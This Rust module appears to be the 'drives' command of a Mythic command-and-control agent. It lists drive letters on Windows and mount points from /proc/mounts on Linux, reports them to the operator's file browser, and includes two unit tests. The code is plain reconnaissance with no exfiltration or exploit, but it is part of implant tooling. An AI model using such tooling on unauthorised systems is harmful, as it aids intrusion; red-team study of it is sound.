//! List available filesystem roots / drives.
//!
//! Windows reports accessible drive-letter roots such as `C:\`.
//! Linux reports unique mount points from `/proc/mounts`.

#[cfg(not(windows))]
use std::collections::BTreeSet;
#[cfg(windows)]
use std::path::Path;

use crate::sys::metadata;
use mythic::{FileBrowserEntry, TaskMessage, TaskResponse};
use serde::Deserialize;

#[derive(Deserialize, Default)]
#[serde(deny_unknown_fields)]
struct Params {}

fn parse_params(task: &TaskMessage) -> Result<Params, String> {
    let parameters = task.parameters.trim();
    let parameters = if parameters.is_empty() {
        "{}"
    } else {
        parameters
    };
    serde_json::from_str::<Params>(parameters).map_err(|e| format!("drives parse error: {e}"))
}

#[cfg(windows)]
fn list_drives() -> Result<Vec<String>, String> {
    let drives = (b'A'..=b'Z')
        .filter_map(|letter| {
            let drive = format!("{}:\\", letter as char);
            Path::new(&drive).exists().then_some(drive)
        })
        .collect();
    Ok(drives)
}

#[cfg(not(windows))]
fn list_drives() -> Result<Vec<String>, String> {
    let mounts = std::fs::read_to_string("/proc/mounts")
        .map_err(|e| format!("read /proc/mounts failed: {e}"))?;
    let mut out = BTreeSet::new();
    for line in mounts.lines() {
        let mut parts = line.split_whitespace();
        let _source = parts.next();
        let Some(mountpoint) = parts.next() else {
            continue;
        };
        out.insert(mountpoint.replace("\\040", " "));
    }
    Ok(out.into_iter().collect())
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    if let Err(e) = parse_params(task) {
        return TaskResponse::failed(task.id, &e);
    }

    let drives = match list_drives() {
        Ok(drives) => drives,
        Err(e) => return TaskResponse::failed(task.id, &e),
    };
    TaskResponse {
        task_id: task.id,
        completed: Some(true),
        status: Some("completed".into()),
        user_output: Some(if drives.is_empty() {
            "(no drives found)".into()
        } else {
            drives.join("\n")
        }),
        file_browser: Some(FileBrowserEntry {
            is_file: false,
            name: "".into(),
            host: metadata::hostname().map(|h| h.to_uppercase()),
            success: Some(true),
            files: drives
                .into_iter()
                .map(|drive| FileBrowserEntry {
                    is_file: false,
                    name: drive,
                    size: Some(0),
                    success: Some(true),
                    ..Default::default()
                })
                .collect(),
            ..Default::default()
        }),
        ..Default::default()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_drives_accepts_empty_parameters() {
        let task = TaskMessage {
            command: "drives".into(),
            parameters: "".into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("completed"));
        assert!(resp.user_output.is_some());
        let fb = resp.file_browser.expect("file_browser set");
        assert_eq!(fb.name, "");
        assert_eq!(fb.success, Some(true));
        assert!(fb.files.iter().all(|entry| !entry.is_file));
    }

    #[test]
    fn test_drives_rejects_arguments() {
        let task = TaskMessage {
            command: "drives".into(),
            parameters: r#"{"path":"/"}"#.into(),
            ..Default::default()
        };
        let resp = handle(&task);
        assert_eq!(resp.status.as_deref(), Some("error"));
    }
}
